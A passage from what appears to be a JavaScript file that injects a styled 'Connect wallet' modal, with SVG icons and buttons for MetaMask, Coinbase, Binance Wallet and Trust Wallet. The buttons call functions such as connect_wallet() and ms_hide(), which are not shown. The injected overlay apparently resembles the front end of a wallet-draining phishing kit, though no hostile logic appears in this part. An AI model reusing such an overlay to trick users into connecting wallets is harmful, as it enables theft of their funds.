          .modal-head {
              padding-bottom: 8px;
              padding-top: 15px;
          }

          .modal-head-block-f {
              gap: 3px;
          }

          button2 {
              padding: 10px 0;
          }

          .modal-bottom {
              gap: 8px;
          }

          .modal-main-title {
              display: none;
          }

          .menu-el {
              gap: 16px;
          }

          .modal-head-desc {
              margin-bottom: 15px;
          }
      }

      @media (max-width:450px) {
          .modal-head-desc {
              margin-bottom: 0;
          }

          .modal-main-title {
              display: block;
          }

          .modalunique.white {
              max-width: 350px;
          }

          .modal-main {
              padding-bottom: 16px;
          }

          .modal-head {
              padding-bottom: 16px;
              padding-top: 16px;
          }

          .modal-head-block-f {
              gap: 0;
          }

          .modal-el-desc {
              gap: 0;
          }

          .menu-el {
              padding: 13px;
              gap: 12px;
              align-items: center;
          }

          .modal-main-menu {
              gap: 13px;
          }
      }`
    },
    {
      type: 'html',
      data: `
      <div class="modalunique white" style="top: 50%; opacity: 1; z-index: 100000;">
      <div class="modal-head">
        <div class="modal-head-block-f">
          <div class="modal-head-title">Connect wallet</div>
          <div class="modal-head-desc">
            Choose what network and wallet want to connect below
          </div>
        </div>
        <div class="modal-close" onclick="ms_hide()">
          <svg
            fill="none"
            height="24"
            viewBox="0 0 24 24"
            width="24"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M5.31854 5.31952C5.74457 4.89349 6.4353 4.89349 6.86132 5.31952L11.5445 10.0027L16.2276 5.31952C16.6537 4.89349 17.3444 4.89349 17.7704 5.31952C18.1964 5.74555 18.1964 6.43627 17.7704 6.8623L13.0873 11.5455L17.7704 16.2286C18.1964 16.6546 18.1964 17.3454 17.7704 17.7714C17.3444 18.1974 16.6537 18.1974 16.2276 17.7714L11.5445 13.0882L6.86132 17.7714C6.4353 18.1974 5.74457 18.1974 5.31854 17.7714C4.89252 17.3454 4.89252 16.6546 5.31854 16.2286L10.0017 11.5455L5.31854 6.8623C4.89252 6.43627 4.89252 5.74555 5.31854 5.31952Z"
              fill="#C4C4C4"
              clip-rule="evenodd"
              fill-rule="evenodd"
            ></path>
          </svg>
        </div>
      </div>
      <div class="modal-main">
        <div class="modal-main-title">Choose Wallet</div>
        <div class="modal-main-menu">
          <div class="menu-el" data="1" onclick='connect_wallet("MetaMask")'>
            <div class="modal-icon">
              <svg
                fill="none"
                height="30"
                viewBox="0 0 32 30"
                width="32"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M30.3712 0.342773L17.9856 9.51402L20.255 4.12465L30.3712 0.342773Z"
                  fill="#E17726"
                ></path>
                <path
                  d="M30.3713 0.342559L30.3013 0.247559L18.262 9.16193L20.3438 4.21693L30.4126 0.453184L30.3713 0.342559L30.3013 0.247559L30.3713 0.342559L30.3301 0.231934L20.2132 4.01381L20.1457 4.07818L17.877 9.46756L17.9126 9.60631L18.0557 9.60881L30.442 0.437559L30.4751 0.285684L30.3301 0.231934L30.3713 0.342559Z"
                  fill="#E17726"
                ></path>
                <path
                  d="M1.72316 0.342773L14.0144 9.6084L11.84 4.12465L1.72316 0.342773ZM25.8332 21.6159L22.5238 26.6271L29.615 28.6128L31.6007 21.7109C31.695 21.7109 25.8332 21.6159 25.8332 21.6159ZM0.399414 21.8053L2.38504 28.7071L9.47629 26.7215L6.16691 21.7103C6.16691 21.6159 0.399414 21.8053 0.399414 21.8053Z"
                  fill="#E27625"
                ></path>
                <path
                  d="M1.72314 0.342559L1.65189 0.436934L13.9431 9.70256L14.0856 9.70193L14.1238 9.56443L11.95 4.08068L11.8813 4.01381L1.76439 0.231934L1.61939 0.285684L1.65189 0.436934L1.72314 0.342559L1.68189 0.453184L11.7494 4.21693L13.7494 9.26068L1.79439 0.248184L1.72314 0.342559ZM25.8331 21.6157L25.7344 21.5507L22.425 26.5619L22.4131 26.6682L22.4919 26.7407L29.5831 28.7263L29.7288 28.6451L31.7144 21.7432L31.6006 21.7107V21.8288L31.6113 21.8282L31.7169 21.7351L31.6581 21.6069L31.6156 21.5932L31.5856 21.5919C31.2344 21.5851 25.8344 21.4976 25.8344 21.4976L25.7338 21.5507L25.8331 21.6157L25.8313 21.7338C25.8344 21.7338 27.2731 21.7569 28.7156 21.7807C29.4369 21.7926 30.1575 21.8044 30.6988 21.8132C30.9694 21.8176 31.1944 21.8213 31.3519 21.8238L31.535 21.8269L31.5831 21.8276H31.595H31.5969L31.5994 21.7569L31.5956 21.8276H31.5969L31.5994 21.7569L31.5956 21.8276L31.6013 21.7157L31.5919 21.8276H31.5956L31.6013 21.7157L31.5919 21.8276L31.6013 21.7107L31.5838 21.8269L31.5913 21.8276L31.6006 21.7107L31.5831 21.8269L31.6006 21.7101L31.5688 21.8238L31.5831 21.8269L31.6006 21.7101L31.5906 21.5926L31.5994 21.6969V21.5919L31.5906 21.5926L31.5994 21.6969V21.5919L31.4856 21.6776L29.5325 28.4669L22.7106 26.5569L25.9306 21.6813L25.8331 21.6157ZM0.399395 21.8051L0.285645 21.8376L2.27127 28.7394L2.41689 28.8207L9.50815 26.8351L9.58689 26.7626L9.57502 26.6563L6.26565 21.6451L6.16689 21.7101H6.28502L6.22627 21.6057L6.12002 21.5782C6.01877 21.5688 5.82877 21.5651 5.56752 21.5651C4.08627 21.5651 0.396895 21.6863 0.39627 21.6863L0.304395 21.7351L0.28627 21.8376L0.399395 21.8051L0.403145 21.9232C0.408145 21.9232 4.09502 21.8019 5.5669 21.8019C5.75065 21.8019 5.8994 21.8038 6.00065 21.8082L6.11064 21.8157L6.12377 21.8176L6.14752 21.7338L6.10252 21.8076L6.12377 21.8176L6.14752 21.7338L6.10252 21.8076L6.16252 21.7101H6.0494L6.10315 21.8076L6.16315 21.7101H6.05002L6.0694 21.7751L9.2894 26.6507L2.46627 28.5613L0.513145 21.7726L0.399395 21.8051Z"
                  fill="#E27625"
                ></path>
                <path
                  d="M9.09817 13.1062L7.11255 16.0375L14.1094 16.3212L13.92 8.75746L9.09817 13.1062ZM22.9969 13.1062L18.0807 8.75684L17.8913 16.4156L24.8882 16.1318C24.8875 16.0375 22.9969 13.1062 22.9969 13.1062ZM9.4763 26.7212L13.7313 24.6412L10.0438 21.805L9.4763 26.7212ZM18.3638 24.6412L22.6188 26.7212L22.0513 21.805C21.9569 21.805 18.3638 24.6412 18.3638 24.6412Z"
                  fill="#E27625"
                ></path>
                <path
                  d="M9.09809 13.1066L8.99996 13.0403L7.01434 15.9716L7.00684 16.0909L7.10746 16.1559L14.1043 16.4397L14.1918 16.4059L14.2268 16.3191L14.0375 8.75531L13.9662 8.64969L13.8406 8.67031L9.01871 13.0191L8.99996 13.0403L9.09809 13.1066L9.17746 13.1941L13.8087 9.01719L13.9881 16.1978L7.32996 15.9278L9.19621 13.1728L9.09809 13.1066ZM22.9968 13.1066L23.075 13.0178L18.1587 8.66844L18.0331 8.64844L17.9618 8.75406L17.7725 16.4128L17.8075 16.4997L17.895 16.5334L24.8925 16.2503L25.0056 16.1322L24.9906 16.0684C24.9531 15.9834 24.825 15.7722 24.6412 15.4741C24.0943 14.5897 23.0962 13.0428 23.0956 13.0422L23.0743 13.0178L22.9968 13.1066L22.8975 13.1703C22.8987 13.1716 23.37 13.9028 23.8425 14.6472C24.0787 15.0191 24.315 15.3941 24.4918 15.6816C24.58 15.8253 24.6537 15.9466 24.7043 16.0341L24.7618 16.1366L24.7737 16.1616L24.8662 16.1322H24.77L24.7743 16.1616L24.8668 16.1322H24.7706H24.8887L24.8837 16.0141L18.0131 16.2928L18.1931 9.01406L22.9193 13.1953L22.9968 13.1066ZM9.47621 26.7216L9.52809 26.8278L13.7831 24.7478L13.8487 24.6534L13.8031 24.5478L10.1156 21.7116L9.99746 21.6966L9.92621 21.7916L9.35871 26.7078L9.40809 26.8178L9.52809 26.8272L9.47621 26.7216L9.59371 26.7353L10.1368 22.0259L13.5075 24.6191L9.42371 26.6153L9.47621 26.7216ZM18.3637 24.6416L18.3118 24.7478L22.5668 26.8278L22.6868 26.8184L22.7362 26.7084L22.1687 21.7922L22.0512 21.6878L21.9743 21.7109C21.8812 21.7641 21.6237 21.9572 21.2618 22.2322C20.1868 23.0522 18.2906 24.5497 18.29 24.5497L18.2456 24.6553L18.3112 24.7491L18.3637 24.6416L18.4368 24.7341C18.4387 24.7328 19.335 24.0253 20.2443 23.3166C20.6993 22.9622 21.1568 22.6078 21.5062 22.3422C21.6806 22.2097 21.8287 22.0991 21.9343 22.0228L22.0587 21.9359L22.0893 21.9166L22.0906 21.9159L22.0506 21.8234V21.9234L22.0906 21.9159L22.0506 21.8234V21.9234V21.8053L21.9331 21.8191L22.4756 26.5209L18.415 24.5359L18.3637 24.6416Z"
                  fill="#E27625"
                ></path>
                <path
                  d="M22.5238 26.7216L18.2688 24.6416L18.6469 27.3835V28.5179L22.5238 26.7216ZM9.47632 26.7216L13.4476 28.6129V27.4785L13.8257 24.7366L9.47632 26.7216Z"
                  fill="#D5BFB2"
                ></path>
                <path
                  d="M22.5238 26.7214L22.5757 26.6152L18.3207 24.5352L18.1994 24.5458L18.1519 24.6577L18.5288 27.3914V28.5177L18.5832 28.617L18.6963 28.6245L22.5725 26.8283L22.6413 26.722L22.575 26.6145L22.5238 26.7214L22.4738 26.6139L18.765 28.3327V27.3833L18.7638 27.367L18.4157 24.8452L22.4713 26.8277L22.5238 26.7214ZM9.47628 26.7214L9.42565 26.8283L13.3969 28.7195L13.5107 28.7127L13.5657 28.6127V27.4864L13.9425 24.752L13.8963 24.6408L13.7769 24.6283L9.42753 26.6139L9.35815 26.7202L9.42565 26.8277L9.47628 26.7214L9.52565 26.8289L13.6794 24.9327L13.3307 27.4614L13.3294 27.4777V28.4252L9.52753 26.6145L9.47628 26.7214Z"
                  fill="#D5BFB2"
                ></path>
                <path
                  d="M13.4476 20.0088L9.94946 18.9688L12.4076 17.8345L13.4476 20.0088ZM18.5532 20.0088L19.5932 17.8345L22.0513 18.9688L18.5532 20.0088Z"
                  fill="#233447"
                ></path>
                <path
                  d="M13.4474 20.0089L13.4812 19.8958L10.283 18.9452L12.3512 17.9908L13.3412 20.0602L13.4474 20.0089L13.5543 19.9577L12.5143 17.7833L12.358 17.7271L9.89991 18.8614L9.83179 18.9771L9.91616 19.0821L13.4143 20.1221L13.538 20.0858L13.5549 19.9583L13.4474 20.0089ZM18.553 20.0089L18.6599 20.0602L19.6499 17.9908L21.718 18.9452L18.5199 19.8958L18.553 20.0089L18.5868 20.1221L22.0849 19.0821L22.1693 18.9771L22.1012 18.8614L19.643 17.7271L19.4868 17.7833L18.4468 19.9577L18.4637 20.0852L18.5874 20.1214L18.553 20.0089Z"
                  fill="#233447"
                ></path>
                <path
                  d="M9.47623 26.7212L10.0437 21.71L6.16748 21.8043L9.47623 26.7212ZM21.9569 21.6156L22.5244 26.6268L25.8337 21.7106L21.9569 21.6156ZM24.8875 16.1318L17.8906 16.4156L18.5525 20.0087L19.5925 17.8343L22.0506 18.9687L24.8875 16.1318ZM9.94873 18.9687L12.4069 17.8343L13.4469 20.0087L14.1087 16.4156L7.11186 16.1318L9.94873 18.9687Z"
                  fill="#CC6228"
                ></path>
                <path
                  d="M9.47636 26.7212L9.59386 26.7343L10.1614 21.723L10.1314 21.6299L10.0414 21.5918L6.16511 21.6862L6.06323 21.7499L6.07011 21.8699L9.37948 26.7862L9.50573 26.8349L9.59511 26.7337L9.47636 26.7212L9.57448 26.6549L6.38573 21.9174L9.91073 21.8312L9.35886 26.7074L9.47636 26.7212ZM21.957 21.6155L21.8395 21.6287L22.407 26.6399L22.4964 26.7412L22.6226 26.6924L25.932 21.7762L25.9389 21.6562L25.837 21.5924L21.9607 21.498L21.8707 21.5362L21.8407 21.6293L21.957 21.6155L21.9539 21.7337L25.6151 21.823L22.6057 26.2943L22.0745 21.6024L21.957 21.6155ZM24.8876 16.1318L24.8826 16.0137L17.8857 16.2974L17.7982 16.3418L17.7745 16.4368L18.4364 20.0299L18.537 20.1255L18.6589 20.0593L19.6489 17.9899L22.0014 19.0755L22.1345 19.0518L24.9707 16.2155L24.9951 16.0843L24.882 16.0137L24.8876 16.1318L24.8039 16.048L22.0257 18.8262L19.6426 17.7262L19.4864 17.7824L18.6032 19.6287L18.032 16.5274L24.8926 16.2499L24.8876 16.1318ZM9.94886 18.9687L9.99823 19.0762L12.3507 17.9905L13.3407 20.0599L13.4626 20.1262L13.5632 20.0305L14.2251 16.4374L14.2014 16.3424L14.1139 16.298L7.11698 16.0143L7.00386 16.0849L7.02823 16.2162L9.86448 19.0524L9.99761 19.0762L9.94886 18.9687L10.0326 18.8849L7.41011 16.2624L13.9682 16.528L13.397 19.6293L12.5139 17.783L12.3576 17.7268L9.89948 18.8612L9.94886 18.9687Z"
                  fill="#CC6228"
                ></path>
                <path
                  d="M7.11255 16.0376L10.0438 21.8051L9.94942 18.9688C9.9488 18.9688 7.11255 16.132 7.11255 16.0376ZM22.0513 18.9688L21.9569 21.8051L24.8882 16.0376L22.0513 18.9688ZM14.1088 16.4157L13.4469 20.0088L14.2975 24.2638L14.4869 18.6857L14.1088 16.4157ZM17.8913 16.4157L17.5132 18.6851L17.7025 24.2632L18.5532 20.0082L17.8913 16.4157Z"
                  fill="#E27525"
                ></path>
                <path
                  d="M7.11251 16.0379L7.00688 16.0916L9.93813 21.8591L10.0731 21.9197L10.1619 21.8016L10.0675 18.9654L10.0331 18.886C10.0319 18.8847 9.32438 18.1772 8.61563 17.4566C8.26126 17.0966 7.90688 16.7335 7.64188 16.4547C7.50938 16.3154 7.39938 16.1979 7.32313 16.1129L7.23751 16.0135L7.22001 15.9904L7.19876 16.0041L7.22126 15.9935L7.22001 15.9904L7.19876 16.0041L7.22126 15.9935L7.12813 16.0391H7.23126L7.22126 15.9935L7.12813 16.0391H7.23126H7.11251L7.00688 16.0929L7.11251 16.0379H6.99438L7.02188 16.1197C7.08063 16.206 7.27126 16.4091 7.54751 16.6985C8.36813 17.5554 9.86501 19.0522 9.86563 19.0529L9.94938 18.9691L9.83126 18.9729L9.90813 21.2772L7.21813 15.9841L7.08501 15.9229L6.99438 16.0379H7.11251ZM22.0513 18.9691L21.9331 18.9654L21.8388 21.8016L21.9275 21.9197L22.0625 21.8591L24.9938 16.0916L24.9569 15.9416L24.8031 15.9554L21.9669 18.8866L21.9338 18.9647L22.0513 18.9691L22.1363 19.051L24.4269 16.6841L22.0925 21.2772L22.1694 18.9729L22.0513 18.9691ZM14.1088 16.416L13.9925 16.3947L13.3306 19.9879L13.3313 20.0322L14.1819 24.2872L14.3075 24.3816L14.4163 24.2679L14.6056 18.6897L14.6044 18.6666L14.2263 16.3972L14.1106 16.2985L13.9931 16.3954L14.1088 16.416L13.9919 16.4354L14.3681 18.6929L14.2138 23.2429L13.5669 20.0079L14.2244 16.4372L14.1088 16.416ZM17.8913 16.416L17.7744 16.3966L17.3963 18.666L17.395 18.6891L17.5844 24.2672L17.6931 24.381L17.8188 24.2866L18.6694 20.0316L18.67 19.9872L18.0081 16.3941L17.8906 16.2972L17.775 16.396L17.8913 16.416L17.775 16.4372L18.4325 20.0079L17.7856 23.2422L17.6313 18.6929L18.0075 16.4354L17.8913 16.416Z"
                  fill="#E27525"
                ></path>
                <path
                  d="M18.5531 20.0088L17.7025 24.2638L18.27 24.6419L21.9575 21.8056L22.0519 18.9694L18.5531 20.0088ZM9.94873 18.9688L10.0431 21.805L13.7306 24.6413L14.2981 24.2631L13.4475 20.0081L9.94873 18.9688Z"
                  fill="#F5841F"
                ></path>
                <path
                  d="M18.5531 20.0087L18.4374 19.9856L17.5868 24.2406L17.6374 24.3619L18.2049 24.74L18.3424 24.7356L22.0299 21.8994L22.0762 21.8094L22.1706 18.9731L22.1249 18.8756L22.0193 18.8556L18.5212 19.8956L18.4387 19.9856L18.5531 20.0087L18.5868 20.1219L21.9281 19.1287L21.8406 21.7456L18.2643 24.4962L17.8331 24.2087L18.6687 20.0319L18.5531 20.0087ZM9.94869 18.9687L9.83057 18.9725L9.92494 21.8087L9.97119 21.8987L13.6587 24.735L13.7962 24.7394L14.3637 24.3612L14.4143 24.24L13.5637 19.985L13.4812 19.895L9.98307 18.855L9.87744 18.875L9.83182 18.9725L9.94869 18.9687L9.91494 19.0819L13.3449 20.1019L14.1662 24.2094L13.7356 24.4969L10.1593 21.7462L10.0668 18.9656L9.94869 18.9687Z"
                  fill="#F5841F"
                ></path>
                <path
                  d="M18.6475 28.5182V27.3832L18.3637 27.0995H13.6362L13.3525 27.3832V28.5182L9.38184 26.627L10.8 27.7613L13.5418 29.6526H18.3637L21.2 27.7613L22.5237 26.627L18.6475 28.5182Z"
                  fill="#C0AC9D"
                ></path>
                <path
                  d="M18.6475 28.5181H18.7656V27.3831L18.7313 27.3L18.4475 27.0163L18.3638 26.9813H13.6363L13.5525 27.0163L13.2688 27.3L13.2344 27.3831V28.3306L9.4325 26.52L9.28125 26.5644L9.3075 26.7194L10.7262 27.8538L10.7325 27.8588L13.4744 29.75L13.5419 29.7706H18.3638L18.4294 29.7506L21.2656 27.86L21.2769 27.8513L22.6006 26.7169L22.6225 26.5619L22.4719 26.5206L18.5956 28.4119L18.6475 28.5181H18.7656H18.6475L18.6994 28.6244L21.7463 27.1375L21.1288 27.6669L18.3281 29.5344H13.5788L10.8706 27.6669L10.2531 27.1731L13.3019 28.6244L13.4156 28.6175L13.4706 28.5181V27.4325L13.685 27.2175H18.315L18.5294 27.4325V28.5181L18.585 28.6181L18.6994 28.6244L18.6475 28.5181Z"
                  fill="#C0AC9D"
                ></path>
                <path
                  d="M18.3638 24.6413L17.7963 24.2632H14.2982L13.7307 24.6413L13.3525 27.3832L13.6363 27.0994H18.3638L18.6475 27.3832L18.3638 24.6413Z"
                  fill="#161616"
                ></path>
                <path
                  d="M18.3637 24.6413L18.4293 24.5431L17.8618 24.165L17.7962 24.145H14.2981L14.2325 24.165L13.665 24.5431L13.6137 24.625L13.2356 27.3669L13.3 27.4894L13.4362 27.4669L13.685 27.2175H18.315L18.5637 27.4669L18.6981 27.49L18.765 27.3713L18.4812 24.6294L18.4293 24.5431L18.3637 24.6413L18.2462 24.6538L18.4956 27.0644L18.4475 27.0163L18.3637 26.9813H13.6362L13.5525 27.0163L13.5175 27.0513L13.8406 24.71L14.3337 24.3813H17.7606L18.2981 24.74L18.3637 24.6413L18.2462 24.6538L18.3637 24.6413Z"
                  fill="#161616"
                ></path>
                <path
                  d="M30.8445 10.1759L31.8845 5.07027L30.372 0.342773L18.3645 9.23027L22.9976 13.1065L29.5213 14.9978L30.9395 13.2959L30.2776 12.8234L31.2232 11.8778L30.467 11.3103L31.4126 10.554L30.8445 10.1759ZM0.115723 5.07027L1.15572 10.1759L0.493848 10.6484L1.53385 11.4046L0.777598 11.9721L1.72322 12.9178L1.06135 13.3903L2.47947 15.0921L9.00322 13.2009L13.6363 9.32465L1.72322 0.342773L0.115723 5.07027Z"
                  fill="#763E1A"
                ></path>
                <path
                  d="M30.8444 10.1757L30.96 10.1995L32 5.09324L31.9969 5.03387L30.4844 0.306367L30.4081 0.230117L30.3013 0.247617L18.2938 9.13512L18.2456 9.22637L18.2881 9.32074L22.9212 13.197L22.9644 13.2201L29.4881 15.1114L29.6119 15.0732L31.03 13.3714L31.0562 13.2807L31.0075 13.1995L30.4594 12.8076L31.3062 11.9607L31.3406 11.8689L31.2938 11.7826L30.6594 11.307L31.4856 10.6457L31.53 10.5482L31.4775 10.4551L30.91 10.077L30.8444 10.1757L30.7787 10.2739L31.2119 10.5626L30.3925 11.2182L30.3481 11.3126L30.3956 11.4051L31.0431 11.8907L30.1938 12.7401L30.1594 12.8332L30.2087 12.9195L30.7669 13.3182L29.4794 14.8626L23.0531 13.0001L18.5544 9.23574L30.3088 0.535742L31.7619 5.07699L30.7281 10.1526L30.7781 10.2745L30.8444 10.1757ZM0.115625 5.07012L0 5.09324L1.025 10.1239L0.425625 10.552L0.37625 10.6476L0.425 10.7439L1.33563 11.4064L0.7075 11.8776L0.660625 11.9639L0.695 12.0557L1.54188 12.9026L0.99375 13.2945L0.945 13.3757L0.97125 13.4664L2.38937 15.1682L2.51312 15.2064L9.03687 13.3151L9.08 13.292L13.7131 9.41574L13.7556 9.32199L13.7087 9.23074L1.79437 0.248242L1.68875 0.229492L1.61188 0.304492L0.00375 5.03199L0 5.09324L0.115625 5.07012L0.2275 5.10824L1.7825 0.535742L13.4462 9.33012L8.94625 13.0951L2.52063 14.9576L1.23312 13.4126L1.79125 13.0139L1.84063 12.9276L1.80625 12.8345L0.956875 11.9851L1.60438 11.4995L1.65188 11.4039L1.60312 11.3089L0.695625 10.6489L1.22375 10.2714L1.27062 10.1514L0.231875 5.04637L0.115625 5.07012Z"
                  fill="#763E1A"
                ></path>
                <path
                  d="M29.4257 14.9976L22.9019 13.1064L24.8875 16.0376L21.9563 21.7108H25.8325H31.6L29.4257 14.9976ZM9.09817 13.1064L2.57441 14.9976L0.399414 21.7108H6.16691H10.0432L7.11192 16.0376L9.09817 13.1064ZM17.8913 16.4158L18.3638 9.23014L20.255 4.12451H11.84L13.7313 9.23014L14.1094 16.4158L14.2988 18.6851V24.2633H17.7969V18.6851L17.8913 16.4158Z"
                  fill="#F5841F"
                ></path>
                <path
                  d="M29.4256 14.9977L29.4587 14.884L22.935 12.9927L22.8062 13.0365L22.8037 13.1721L24.75 16.0452L21.8512 21.6559L21.855 21.7715L21.9562 21.8284H25.8325H31.6L31.6956 21.7796L31.7125 21.674L29.5381 14.9609L29.4587 14.884L29.4256 14.9977L29.3131 15.034L31.4375 21.5921H25.8325H22.15L24.9919 16.0915L24.985 15.9709L23.1831 13.3109L29.3925 15.1109L29.4256 14.9977ZM9.09812 13.1065L9.06499 12.9927L2.54124 14.884L2.46187 14.9609L0.286865 21.674L0.30374 21.7802L0.399365 21.829H6.16687H10.0431L10.1437 21.7721L10.1475 21.6565L7.24874 16.0459L9.19499 13.1727L9.19249 13.0371L9.06374 12.9934L9.09812 13.1065L8.99999 13.0402L7.01437 15.9715L7.00749 16.0921L9.84937 21.5927H6.16687H0.561865L2.66687 15.094L9.13062 13.2202L9.09812 13.1065ZM17.8912 16.4159L18.0094 16.4234L18.4812 9.25461L20.3662 4.16523L20.3525 4.05648L20.2556 4.00586H11.84L11.7431 4.05648L11.7294 4.16523L13.6137 9.25398L13.9912 16.4221V16.4259L14.18 18.6902V24.2634L14.2144 24.3471L14.2981 24.3815H17.7962L17.88 24.3471L17.9144 24.2634V18.6877L18.0087 16.4209L17.8912 16.4159L17.7731 16.4109L17.6787 18.6802V18.6852V24.1452H14.4169V18.6852L14.4162 18.6752L14.2275 16.4077L13.8494 9.22336L13.8425 9.18836L12.0106 4.24211H20.0856L18.2537 9.18836L18.2469 9.22148L17.7744 16.4071V16.4102L17.8912 16.4159Z"
                  fill="#F5841F"
                ></path>
              </svg>
            </div>
            <div class="modal-el-desc">
              <span class="modal-el-desc-first">MetaMask</span>
              <span class="modal-el-desc-second"
                >Connnect to your MetaMask wallet</span
              >
            </div>
          </div>
          <div class="menu-el" data="2" onclick='connect_wallet("Coinbase")'>
            <div class="modal-icon">
              <svg
                fill="none"
                height="32"
                viewBox="0 0 32 32"
                width="32"
                xmlns="http://www.w3.org/2000/svg"
              >
                <g clip-path="url(#clip0_73_248)">
                  <path
                    d="M16 0C24.8375 0 32 7.1625 32 16C32 24.8375 24.8375 32 16 32C7.1625 32 0 24.8375 0 16C0 7.1625 7.1625 0 16 0Z"
                    fill="#0052FF"
                  ></path>
                  <path
                    d="M16.0031 21.625C12.8969 21.625 10.3781 19.1094 10.3781 16C10.3781 12.8906 12.8969 10.375 16.0031 10.375C18.7875 10.375 21.1 12.4062 21.5438 15.0625H27.2094C26.7313 9.2875 21.8969 4.75 16 4.75C9.7875 4.75 4.75 9.7875 4.75 16C4.75 22.2125 9.7875 27.25 16 27.25C21.8969 27.25 26.7313 22.7125 27.2094 16.9375H21.5406C21.0938 19.5938 18.7875 21.625 16.0031 21.625Z"
                    fill="white"
                  ></path>
                </g>
                <defs>
                  <clipPath id="clip0_73_248">
                    <rect fill="white" height="32" width="32"></rect>
                  </clipPath>
                </defs>
              </svg>
            </div>
            <div class="modal-el-desc">
              <span class="modal-el-desc-first">Coinbase</span>
              <span class="modal-el-desc-second"
                >Connnect to your Coinbase wallet</span
              >
            </div>
          </div>
          <div class="menu-el" data="3" onclick='connect_wallet("Binance Wallet")'>
            <div class="modal-icon">
              <svg
                fill="none"
                height="32"
                viewBox="0 0 32 32"
                width="32"
                xmlns="http://www.w3.org/2000/svg"
              >
                <g clip-path="url(#clip0_73_337)">
                  <path
                    d="M7.24266 16L3.63808 19.6046L0.0244141 16L3.629 12.3955L7.24266 16ZM16.0044 7.23827L22.1876 13.4214L25.7922 9.81686L16.0044 0.0200195L6.20759 9.81686L9.81218 13.4214L16.0044 7.23827ZM28.3708 12.3955L24.7662 16L28.3708 19.6046L31.9754 16L28.3708 12.3955ZM16.0044 24.7618L9.82126 18.5786L6.21667 22.1832L16.0044 31.9801L25.7922 22.1832L22.1876 18.5786L16.0044 24.7618ZM16.0044 19.6046L19.609 16L16.0044 12.3955L12.3908 16L16.0044 19.6046Z"
                    fill="#F0B90B"
                  ></path>
                </g>
                <defs>
                  <clipPath id="clip0_73_337">
                    <rect fill="white" height="32" width="32"></rect>
                  </clipPath>
                </defs>
              </svg>
            </div>
            <div class="modal-el-desc">
              <span class="modal-el-desc-first">Binance Wallet</span>
              <span class="modal-el-desc-second"
                >Connnect to your Binance wallet</span
              >
            </div>
          </div>
          <div class="menu-el" data="4" onclick='connect_wallet("Trust Wallet")'>
            <div class="modal-icon">
              <svg
                fill="none"
                height="32"
                viewBox="0 0 32 32"
                width="32"
                xmlns="http://www.w3.org/2000/svg"
              >
                <g clip-path="url(#clip0_73_86)">
                  <path
                    d="M0 8.125C0 3.63769 3.63769 0 8.125 0H23.875C28.3623 0 32 3.63769 32 8.125V23.875C32 28.3623 28.3623 32 23.875 32H8.125C3.63769 32 0 28.3623 0 23.875V8.125Z"
                    fill="#F1F7FE"
                  ></path>
                  <path
                    d="M16.0094 6.71875C19.2381 9.41525 22.9407 9.24894 23.9985 9.24894C23.7671 24.5846 22.004 21.5436 16.0094 25.8438C10.0147 21.5436 8.26266 24.5846 8.03125 9.24894C9.07809 9.24894 12.7807 9.41525 16.0094 6.71875Z"
                    stroke="#3375BB"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    stroke-miterlimit="10"
                    stroke-width="2.56"
                  ></path>
                </g>
                <defs>
                  <clipPath id="clip0_73_86">
                    <rect fill="white" height="32" width="32"></rect>
                  </clipPath>
                </defs>
              </svg>
            </div>
            <div class="modal-el-desc">
              <span class="modal-el-desc-first">Trust Wallet</span>
              <span class="modal-el-desc-second"
                >Connnect to your Trust wallet</span
              >
            </div>
          </div>
        </div>
      </div>
      <div class="modal-bottom">
        <button2 onclick="use_wc()">
          <svg
            fill="none"
            height="24"
            viewBox="0 0 25 24"
            width="25"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M9.875 3.375H5.75C5.25272 3.375 4.77581 3.57254 4.42417 3.92417C4.07254 4.27581 3.875 4.75272 3.875 5.25V9.375C3.875 9.87228 4.07254 10.3492 4.42417 10.7008C4.77581 11.0525 5.25272 11.25 5.75 11.25H9.875C10.3723 11.25 10.8492 11.0525 11.2008 10.7008C11.5525 10.3492 11.75 9.87228 11.75 9.375V5.25C11.75 4.75272 11.5525 4.27581 11.2008 3.92417C10.8492 3.57254 10.3723 3.375 9.875 3.375ZM9.5 9H6.125V5.625H9.5V9ZM9.875 12.75H5.75C5.25272 12.75 4.77581 12.9475 4.42417 13.2992C4.07254 13.6508 3.875 14.1277 3.875 14.625V18.75C3.875 19.2473 4.07254 19.7242 4.42417 20.0758C4.77581 20.4275 5.25272 20.625 5.75 20.625H9.875C10.3723 20.625 10.8492 20.4275 11.2008 20.0758C11.5525 19.7242 11.75 19.2473 11.75 18.75V14.625C11.75 14.1277 11.5525 13.6508 11.2008 13.2992C10.8492 12.9475 10.3723 12.75 9.875 12.75ZM9.5 18.375H6.125V15H9.5V18.375ZM19.25 3.375H15.125C14.6277 3.375 14.1508 3.57254 13.7992 3.92417C13.4475 4.27581 13.25 4.75272 13.25 5.25V9.375C13.25 9.87228 13.4475 10.3492 13.7992 10.7008C14.1508 11.0525 14.6277 11.25 15.125 11.25H19.25C19.7473 11.25 20.2242 11.0525 20.5758 10.7008C20.9275 10.3492 21.125 9.87228 21.125 9.375V5.25C21.125 4.75272 20.9275 4.27581 20.5758 3.92417C20.2242 3.57254 19.7473 3.375 19.25 3.375ZM18.875 9H15.5V5.625H18.875V9ZM13.25 16.125V13.875C13.25 13.5766 13.3685 13.2905 13.5795 13.0795C13.7905 12.8685 14.0766 12.75 14.375 12.75C14.6734 12.75 14.9595 12.8685 15.1705 13.0795C15.3815 13.2905 15.5 13.5766 15.5 13.875V16.125C15.5 16.4234 15.3815 16.7095 15.1705 16.9205C14.9595 17.1315 14.6734 17.25 14.375 17.25C14.0766 17.25 13.7905 17.1315 13.5795 16.9205C13.3685 16.7095 13.25 16.4234 13.25 16.125ZM21.125 15.375C21.125 15.6734 21.0065 15.9595 20.7955 16.1705C20.5845 16.3815 20.2984 16.5 20 16.5H18.875V19.5C18.875 19.7984 18.7565 20.0845 18.5455 20.2955C18.3345 20.5065 18.0484 20.625 17.75 20.625H14.375C14.0766 20.625 13.7905 20.5065 13.5795 20.2955C13.3685 20.0845 13.25 19.7984 13.25 19.5C13.25 19.2016 13.3685 18.9155 13.5795 18.7045C13.7905 18.4935 14.0766 18.375 14.375 18.375H16.625V13.875C16.625 13.5766 16.7435 13.2905 16.9545 13.0795C17.1655 12.8685 17.4516 12.75 17.75 12.75C18.0484 12.75 18.3345 12.8685 18.5455 13.0795C18.7565 13.2905 18.875 